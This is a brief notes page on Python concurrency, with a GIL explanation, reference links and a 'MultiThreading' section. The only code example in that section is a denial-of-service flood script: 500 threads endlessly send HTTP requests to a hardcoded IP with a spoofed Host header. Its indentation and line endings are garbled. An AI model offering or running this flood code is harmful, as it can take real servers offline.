# Concurrency

## Global Interpreter Lock (GIL)

GIL is a mutex that protects access to Python objects, preventing multiple threads from executing Python bytecodes at once. This lock is necessary mainly because CPython's memory management is not thread-safe.

This essentially means that a process can run only one thread at a time. When a thread starts running, it acquires GIL and when it waits for I/O, it releases the GIL, so that other threads of that process can run.

Solution -

- Run multiple Python instances

## References

<https://wiki.python.org/moin/GlobalInterpreterLock>

<https://pybay.com/site_media/slides/raymond2017-keynote/index.html>

[Raymond Hettinger, Keynote on Concurrency, PyBay 2017](https://www.youtube.com/watch?v=9zinZmE3Ogk&index=2&list=WL&t=0s)

<https://realpython.com/python-concurrency>

<https://www.toptal.com/python/beginners-guide-to-concurrency-and-parallelism-in-python>

<https://www.tutorialspoint.com/concurrency_in_python/index.htm>

[**Tutorial: Santiago Basulto - Python Concurrency: from beginner to pro**](https://www.youtube.com/watch?v=18B1pznaU1o)

[Back to Basics: Concurrency](https://youtu.be/5pYKAoD3Apk) - C++

## MultiThreading

```python
import threading

import socket

target = '10.0.0.138'

port = 80

fake_ip = '182.21.20.32'

def attack():

while True:

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((target, port))

s.sendto(("GET /" + target + " HTTP/1.1rn").encode('ascii'), (target, port))

s.sendto(("Host: " + fake_ip + " rnrn").encode('ascii'), (target, port))

s.close()

for i in range(500):

thread = threading.Thread(target=attack)

thread.start()
```

<https://bovage.hashnode.dev/what-exactly-is-multithreading>
